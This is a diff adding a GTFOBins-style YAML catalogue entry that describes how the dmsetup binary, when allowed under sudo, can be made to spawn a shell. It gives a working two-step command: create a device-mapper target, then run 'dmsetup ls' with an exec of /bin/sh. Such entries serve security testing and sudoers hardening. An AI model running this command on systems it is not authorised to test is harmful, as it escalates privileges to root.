@@ -1,0 +1,30 @@
+id: gtfobins/dmsetup/shell/sudo
+type: binary
+platform: linux
+name: dmsetup
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'dmsetup create base <<EOF
+
+    0 3534848 linear /dev/loop0 94208
+
+    EOF
+
+    dmsetup ls --exec ''/bin/sh -s'''
+references:
+- https://gtfobins.github.io/gtfobins/dmsetup/
+tags:
+- linux
+- unix
+- gtfobins
